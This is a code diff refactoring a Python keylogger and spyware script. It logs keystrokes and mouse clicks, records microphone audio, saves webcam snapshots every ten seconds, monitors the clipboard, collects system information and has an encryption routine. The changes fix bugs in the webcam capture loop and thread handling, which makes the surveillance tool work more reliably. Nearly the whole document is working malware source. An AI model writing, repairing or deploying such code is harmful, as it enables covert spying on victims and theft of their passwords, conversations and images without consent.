@@ -28,7 +28,7 @@ RATE = 48000
 WAVE_OUTPUT_FILENAME = "output.wav"
 
 audio = pyaudio.PyAudio()
-stop_audio_thread = threading.Event()
+stop_thread = threading.Event()
 
 def setup_logging():
     logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')
@@ -57,6 +57,27 @@ def log_system_info():
         logging.info(f"{key}: {value}")
     logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")
 
+
+def on_press(key):
+    logging.info(f"[Key Pressed] - {key}")
+
+
+def on_release(key):
+    if key == Key.esc:
+        print("Stopping the script.")
+        stop_thread.set()
+        return False
+
+def on_click(button, pressed):
+    if pressed:
+        if button == mouse.Button.left:
+            logging.info('[Mouse Click] - Left Click')
+        elif button == mouse.Button.right:
+            logging.info('[Mouse Click] - Right Click')
+        elif button == mouse.Button.middle:
+            logging.info('[Mouse Click] - Middle Click')
+
+
 def start_audio_recording():
     try:
         stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
@@ -66,7 +87,7 @@ def start_audio_recording():
             wf.setframerate(RATE)
 
             print("Audio recording started. Press 'Esc' to stop.")
-            while not stop_audio_thread.is_set():
+            while not stop_thread.is_set():
                 data = stream.read(CHUNK)
                 wf.writeframes(data)
         
@@ -79,28 +100,29 @@ def start_audio_recording():
 
 def webcam():
     try:
-        while stop_audio_thread.is_set():
-            pathlib.Path('WebcamPics').mkdir(parents=True, exist_ok=True)
-            cam_path = 'WebcamPics\\'
-            cam = cv2.VideoCapture(0)
+        pathlib.Path('WebcamPics').mkdir(parents=True, exist_ok=True)
+        cam_path = 'WebcamPics\\'
+        cam = cv2.VideoCapture(0)
+        for x in range(0, 10):
+            ret, img = cam.read()
+            file = (cam_path + '{}.jpg'.format(x))
+            cv2.imwrite(file, img)
+            time.sleep(10)
+            if stop_thread.is_set():
+                break  # Break the loop if the stop flag is set
 
-            for x in range(0, 10):
-                ret, img = cam.read()
-                file = (cam_path  + '{}.jpg'.format(x))
-                cv2.imwrite(file, img)
-                time.sleep(10)
-
-            cam.release                                     # Closes video file or capturing device
-            cv2.destroyAllWindows
+        cam.release()  # Properly release the camera
+        cv2.destroyAllWindows()  # Close OpenCV windows
 
     except Exception as e:
-        print("WebcamPics could not be saved :" + str(e))
+        print("WebcamPics could not be saved: " + str(e))
+
 
 def clipboard():
     previous_clipboard_data = ""  # Store the previous clipboard content
     
     try:
-        while not stop_audio_thread.is_set():
+        while not stop_thread.is_set():
             win32clipboard.OpenClipboard()
             pasted_data = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
@@ -119,23 +141,6 @@ def clipboard():
         with open(CLIPBOARD, "a") as file:
             file.write("\n Clipboard could not be copied: " + str(e) + "\n")
 
-def on_press(key):
-    logging.info(f"[Key Pressed] - {key}")
-
-def on_release(key):
-    if key == Key.esc:
-        print("Stopping the script.")
-        stop_audio_thread.set()
-        return False
-
-def on_click(button, pressed):
-    if pressed:
-        if button == mouse.Button.left:
-            logging.info('[Mouse Click] - Left Click')
-        elif button == mouse.Button.right:
-            logging.info('[Mouse Click] - Right Click')
-        elif button == mouse.Button.middle:
-            logging.info('[Mouse Click] - Middle Click')
 
 def encrypt(file_path):
     # Load the key from the file
@@ -160,14 +165,10 @@ def main():
         log_system_info()
 
 
-        clipboard_thread = threading.Thread(target=clipboard)
-        webcam_thread = threading.Thread(target=webcam)
-        audio_thread = threading.Thread(target=start_audio_recording)
+        t1 = threading.Thread(target=clipboard) ; t1.start()
+        t2 = threading.Thread(target=webcam) ; t2.start()
+        t3 = threading.Thread(target=start_audio_recording) ; t3.start()
 
-        # Start threads
-        clipboard_thread.start()
-        audio_thread.start()
-        webcam_thread.start()
 
         with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, mouse.Listener(on_click=on_click) as mouse_listener:
             print("Script started. Press 'Esc' to stop.")
@@ -187,9 +188,10 @@ def main():
 
     finally:
         # Ensure audio is terminated and threads are joined
-        stop_audio_thread.set()
-        audio_thread.join()
-        clipboard_thread.join()
+        stop_thread.set()
+        t1.join()
+        t2.join()
+        t3.join()
 
 if __name__ == '__main__':
     try:
